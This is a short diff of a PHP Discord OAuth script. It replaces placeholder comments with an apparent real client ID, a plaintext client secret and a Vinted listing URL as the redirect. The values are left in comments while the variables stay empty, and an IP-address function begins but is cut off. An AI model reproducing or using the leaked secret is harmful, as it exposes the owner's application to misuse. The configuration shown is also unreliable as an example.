@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = ""; //1163493678233436280
+$client_secret = ""; //fUuJWDssDSqbofc_UoQYZUsChjqAm7S5
+$redirect      = ""; //https://www.vinted.fr/items/3618867659-nike-dunk-coast-blue-385?homepage_session_id=b8dc05f7-3173-497c-8f84-f1b42a33481f
 
 function get_ip_address()
 {
